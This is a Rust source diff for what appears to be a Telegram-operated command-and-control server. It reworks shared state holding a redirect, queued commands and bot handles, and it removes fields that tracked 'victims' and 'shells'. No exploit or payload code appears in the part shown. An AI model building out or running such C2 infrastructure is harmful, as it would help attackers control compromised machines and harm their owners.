@@ -1,29 +1,31 @@
+pub mod sql;
+pub mod routes;
 pub mod payload;
 pub mod bot;
 pub mod index;
 
 use dashmap::DashMap;
-use std::sync::{Arc, Mutex};
-use std::time::Instant;
+use std::{sync::{Arc, Mutex}, time::{SystemTime, UNIX_EPOCH}};
+use teloxide::{adaptors::Throttle, prelude::*};
+use sqlx::SqlitePool;
 
-// store the global state for telegram and axum web server
 pub struct AppState {
+    pub db: SqlitePool,     
     pub redirect: Arc<Mutex<String>>,
-    pub victim: Arc<Mutex<u32>>,
-    pub command: Arc<DashMap<String, String>>, 
-    pub shells: Arc<DashMap<String, Instant>>,       
-    pub visitor: Arc<DashMap<String, Instant>>,
+    pub command: Arc<DashMap<String, (String, u64)>>, 
+    pub msg: Arc<DashMap<i32, u64>>,
     pub admin_id: i64,
+    pub bot: Throttle<Bot>,
 }
 
-// avoid HTML special character ; break output on telegram  
 pub fn escape_html(s: &str) -> String {
     s.replace('&', "&amp;")
-        .replace('<', "&lt;")
-        .replace('>', "&gt;")
-        .replace('"', "&quot;")
-        .replace('\'', "&#039;")
-        .replace('/', "&#47;")
-        .replace('\\', "&#92;")
-        .replace('`', "&#96;")
+    .replace('<', "&lt;")
+    .replace('>', "&gt;")
+    .replace('"', "&quot;")
+    .replace('\'', "&#039;")
+}
+
+pub fn get_now() -> u64 {
+    SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs()
 }
